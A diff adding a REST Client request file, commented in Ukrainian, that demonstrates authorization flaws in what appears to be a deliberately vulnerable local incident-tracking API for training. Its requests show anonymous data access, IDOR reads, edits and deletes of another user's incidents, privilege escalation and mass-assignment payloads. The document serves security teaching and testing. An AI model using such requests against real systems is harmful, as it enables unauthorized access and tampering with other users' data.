@@ -1,0 +1,122 @@
+@host = http://localhost:5080
+@aliceId = 20000000-0000-0000-0000-000000000001
+@bobId = 20000000-0000-0000-0000-000000000002
+@aliceNewId = 20000000-0000-0000-0000-000000000003
+@bobNewId = 20000000-0000-0000-0000-000000000004
+@bobCommentId = 30000000-0000-0000-0000-000000000002
+@internalCommentId = 30000000-0000-0000-0000-000000000003
+@bobUserId = 10000000-0000-0000-0000-000000000002
+
+# Порядок: зверху вниз. Cookie REST Client запам'ятовує для host; щоб діяти від іншого
+# користувача, виконайте його login-запит. Пароль береться зі змінної SeedUsers__Password.
+# ПІСЛЯ мутацій (PUT/DELETE/triage) стан БД змінено: перед повтором зробіть --reset-database.
+
+############################################################
+### P-00 Спершу logout (401 — нормально, якщо cookie ще немає)
+POST {{host}}/api/auth/logout
+
+### P-01 АНОНІМ: details чужого/будь-якого інциденту (vulnerable: 200 без login)
+GET {{host}}/api/incidents/{{bobId}}
+Accept: application/json
+
+### P-02 АНОНІМ: search (vulnerable: 200 без login, повертає чужі записи)
+GET {{host}}/api/incidents/search?q=O%27Brien
+Accept: application/json
+
+### P-03 АНОНІМ: severity-summary (vulnerable: 200 без login)
+GET {{host}}/api/incidents/severity-summary
+Accept: application/json
+
+############################################################
+### Alice login → 204
+POST {{host}}/api/auth/login
+Content-Type: application/json
+
+{ "userName": "alice", "password": "{{$processEnv SeedUsers__Password}}" }
+
+### A-02 Власний ресурс Alice → 200, id …0001
+GET {{host}}/api/incidents/{{aliceId}}
+Accept: application/json
+
+### A-03 (ДО виправлення) ТОЙ САМИЙ cookie Alice, змінено лише id на Bob → 200 і ДАНІ BOB  ← IDOR/BOLA
+GET {{host}}/api/incidents/{{bobId}}
+Accept: application/json
+
+### P-04 Alice: list (vulnerable: усі 5 інцидентів, зокрема Bob)
+GET {{host}}/api/incidents
+Accept: application/json
+
+### P-05 Alice: search (vulnerable: чужий інцидент Bob …0004)
+GET {{host}}/api/incidents/search?q=O%27Brien
+Accept: application/json
+
+### P-06 Alice: severity-summary (vulnerable: рахує всі п'ять: High 1, Medium 1, Low 3)
+GET {{host}}/api/incidents/severity-summary
+Accept: application/json
+
+### P-07 Alice: child — коментар до інциденту BOB за прямим id (vulnerable: 200)
+GET {{host}}/api/incident-comments/{{bobCommentId}}
+Accept: application/json
+
+### P-08 Alice: child — INTERNAL коментар до свого інциденту (vulnerable: 200, Reporter бачить internal)
+GET {{host}}/api/incident-comments/{{internalCommentId}}
+Accept: application/json
+
+############################################################
+### Мутація Alice → Bob. Крок 1: стан ДО
+GET {{host}}/api/incidents/{{bobNewId}}
+Accept: application/json
+
+### Мутація Alice → Bob. Крок 2: Alice змінює інцидент Bob (vulnerable: 204)
+PUT {{host}}/api/incidents/{{bobNewId}}
+Content-Type: application/json
+
+{ "title": "PoC changed by Alice", "description": "Змінено без права власника." }
+
+### Мутація Alice → Bob. Крок 3: стан ПІСЛЯ (title змінився)
+GET {{host}}/api/incidents/{{bobNewId}}
+Accept: application/json
+
+### Delete Alice → Bob: видалення чужого інциденту (vulnerable: 204)
+DELETE {{host}}/api/incidents/{{bobNewId}}
+
+### Delete Alice → Bob: після видалення (vulnerable: 404 — ресурс знищено)
+GET {{host}}/api/incidents/{{bobNewId}}
+Accept: application/json
+
+############################################################
+### Вертикальне підвищення. V-01: Reporter Alice виконує triage свого New-інциденту (vulnerable: 204)
+POST {{host}}/api/incidents/{{aliceNewId}}/triage
+
+### V-01 перевірка: статус став Triaged
+GET {{host}}/api/incidents/{{aliceNewId}}
+Accept: application/json
+
+### V-02 Вертикальне підвищення + overposting: звичайний update із підробленими полями (vulnerable: 204)
+PUT {{host}}/api/incidents/{{aliceId}}
+Content-Type: application/json
+
+{
+  "title": "Alice forged fields",
+  "description": "x",
+  "severity": "Critical",
+  "status": "Resolved",
+  "ownerUserId": "{{bobUserId}}",
+  "role": "Administrator",
+  "isTransitionAllowed": true
+}
+
+### V-02 перевірка: severity Critical, status Resolved, власник «Боб Мельник», опис «x» (role та isTransitionAllowed проігноровано: таких властивостей у DTO немає)
+GET {{host}}/api/incidents/{{aliceId}}
+Accept: application/json
+
+############################################################
+### Bob login → 204 (зворотний напрямок)
+POST {{host}}/api/auth/login
+Content-Type: application/json
+
+{ "userName": "bob", "password": "{{$processEnv SeedUsers__Password}}" }
+
+### Bob → інцидент Alice (vulnerable: 200)
+GET {{host}}/api/incidents/{{aliceNewId}}
+Accept: application/json
